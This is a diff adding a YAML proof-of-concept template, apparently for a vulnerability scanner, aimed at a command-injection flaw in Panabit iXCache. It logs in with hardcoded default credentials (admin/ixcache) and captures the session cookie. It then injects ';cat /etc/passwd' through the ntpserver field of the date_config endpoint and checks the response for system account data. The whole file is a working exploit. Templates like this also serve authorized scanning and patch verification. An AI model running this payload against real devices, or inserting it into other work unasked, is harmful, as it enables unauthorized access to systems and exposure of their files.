@@ -1,0 +1,31 @@
+id: poc-yaml-panabit-ixcache-rce
+info:
+  name: Panabit-iXCache-date_config-命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: iXCache
+requests:
+- method: POST
+  path: /login/userverify.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password=ixcache
+  expression: status_code == 200 && contains(headers, "Set-Cookie:") && !contains(body,
+    "\"用户名或密码不对!\"") && contains(body, "CONTENT=\"0;URL=/cgi-bin/monitor.cgi\"")
+  output:
+  - regex_match(headers, "pauser_(?P<cookie>.*?);Path=/")
+- method: POST
+  path: /cgi-bin/Maintain/date_config
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: pauser_{{.cookie}}
+  data: 'ntpserver=0.0.0.0;cat /etc/passwd&year=2000&month=08&day=15&hour=16&minute=43&second=57&ifname=
+
+    '
+  expression: status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && contains(gbk_decode(body), "<b>系统管理->系统时间</b>") && contains(gbk_decode(body),
+    "alert(\"操作成功!\");")
+variables: {}
+transport: http
